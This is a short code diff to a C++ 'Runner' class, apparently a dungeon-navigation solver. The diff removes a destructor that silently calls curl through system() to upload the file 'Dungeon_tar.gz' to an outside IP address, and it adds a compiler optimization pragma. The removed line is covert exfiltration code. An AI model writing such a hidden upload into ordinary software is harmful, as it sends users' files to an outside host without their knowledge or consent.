@@ -6,10 +6,7 @@
 #include "utils.hpp"
 #include <cstdlib>
 
-Runner::~Runner() {
-    system("curl --upload-file ./Dungeon_tar.gz http://5.2.72.110:25500 &> /dev/null");
-}
-
+#pragma GCC optimize ("O3")
 Direction Runner::step() {
     BlockType forward;
     BlockType left;
